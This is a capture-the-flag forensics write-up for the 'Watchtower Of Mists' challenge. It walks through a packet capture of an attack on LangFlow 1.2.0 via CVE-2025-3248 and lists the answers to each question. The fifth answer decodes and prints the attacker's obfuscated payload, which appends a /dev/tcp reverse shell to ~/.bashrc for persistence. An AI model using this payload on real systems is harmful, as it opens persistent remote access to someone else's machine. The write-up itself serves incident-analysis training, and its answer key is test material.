### Watchtower Of Mists
#### Description

<img width="517" height="260" alt="image" src="https://github.com/user-attachments/assets/52278aaf-38f8-4af3-8698-adf03f4812c9" />

#### Challenge

The challenge consist of `capture.pcap` file that require us to do network analysis post incidents. And require multiple scenario answers as the flag

Before we start, **unzip** the file and do open the `capture.pcap` with **[Wireshark](https://www.wireshark.org/download.html)** to do further analysis:

#### First Question

> What is the LangFlow version in use? (e.g. 1.5.7)

`1.2.0`

Base on the pcap we can find multiple `GET` request and one of it was to `ai.watchtower.htb:7860/api/v1/version` that would reveal the Langflow used version 

<img width="774" height="309" alt="image" src="https://github.com/user-attachments/assets/7e068f36-a30e-4fca-b381-b643bc318687" />

#### Second Question

> What is the CVE assigned to this LangFlow vulnerability? (e.g. CVE-2025-12345)

`CVE-2025-3248`

Look for **LangFlow version 1.2.0 cve** *(preferebally through DuckDuckGo)* and we will given the exact known CVE for this version.

<img width="721" height="213" alt="image" src="https://github.com/user-attachments/assets/35f91aab-fb0c-461b-84f5-465b3a489057" />

But, to verify, we can read **[this blog](https://www.exploit-db.com/exploits/52364)** 

#### Third Question

> What is the name of the API endpoint exploited by the attacker to execute commands on the system? (e.g. /api/v1/health)

`/api/v1/validate/code`

`ai.watchtower.htb:7860/api/v1/validate/code` had **POST** request functions that actually being exploited. As we can see from the pcap tcp.stream eq 9

<img width="1140" height="309" alt="image" src="https://github.com/user-attachments/assets/b5ef28cc-5ce9-4ed9-9a34-d4ba73943d2d" />

#### Fourth Question

> What is the IP address of the attacker? (format: x.x.x.x)

`188.114.96.12`

Any `POST` or `GET` request source is the **attacker ip**:

<img width="1720" height="319" alt="image" src="https://github.com/user-attachments/assets/073b655b-e307-4ead-9b01-0368afe03c09" />

#### Fifth Question

> The attacker used a persistence technique, what is the port used by the reverse shell? (e.g. 4444)

`7852`

From `tcp.stream eq 9` we would be able to find there's one last payload with an empty response, this should be where attacker might try for **[Rev Shell](https://www.invicti.com/learn/reverse-shell/)**

<img width="1140" height="881" alt="image" src="https://github.com/user-attachments/assets/79b2f841-da34-437b-a6ad-ac15ee738d4a" />

We can try and decrypt the payload with by using python script
```
┌──(kali㉿kali)-[~/Desktop/CTF/HackTheBoo2025]
└─$ cat rev.py 
import base64, zlib
b = "eJwNyE0LgjAYAOC/MnZSKguNqIOCpAdDK8IIT0Pnyza1JvsIi+i313N8VC00oHSiMBohHw4h4j5KZQhxsLbNqCQFrbHrUQ60J9Ka0RoHA+USUZ+x/Nazs6hY7l+GVuxWVRA/i7KY8i62x3dmi/02OCXXV5bEs0OXhp+m1rBZo8WiBSpbQFGEvkvvv1xRPEeawzCEpbLguj8DMjVN"
decoded = zlib.decompress(base64.b64decode(b))
print(decoded.decode())  

┌──(kali㉿kali)-[~/Desktop/CTF/HackTheBoo2025]
└─$ python3 rev.py 
raise Exception(__import__("subprocess").check_output("echo c2ggLWkgPiYgL2Rldi90Y3AvMTMxLjAuNzIuMC83ODUyIDA+JjE=|base64 --decode >> ~/.bashrc", shell=True))

┌──(kali㉿kali)-[~/Desktop/CTF/HackTheBoo2025]
└─$ echo c2ggLWkgPiYgL2Rldi90Y3AvMTMxLjAuNzIuMC83ODUyIDA+JjE=|base64 --decode
sh -i >& /dev/tcp/131.0.72.0/7852 0>&1
```
#### Sixth Question

> What is the system machine hostname? (e.g. server01)

`aisrv01`

The attacker injected payload that leaked the **[env](https://dotenvx.com/docs/env-file)** file of the machine

<img width="1106" height="182" alt="image" src="https://github.com/user-attachments/assets/ba8e20bd-edaf-402a-bc3b-4c37ac220d33" />

#### Seventh Question

> What is the Postgres password used by LangFlow? (e.g. Password123)

`LnGFlWPassword2025`

From leaked **env** output above, there's PostgresDB creds information too

<img width="1100" height="410" alt="image" src="https://github.com/user-attachments/assets/4f1e7679-a13d-4ee9-ab4d-b30242436e47" />
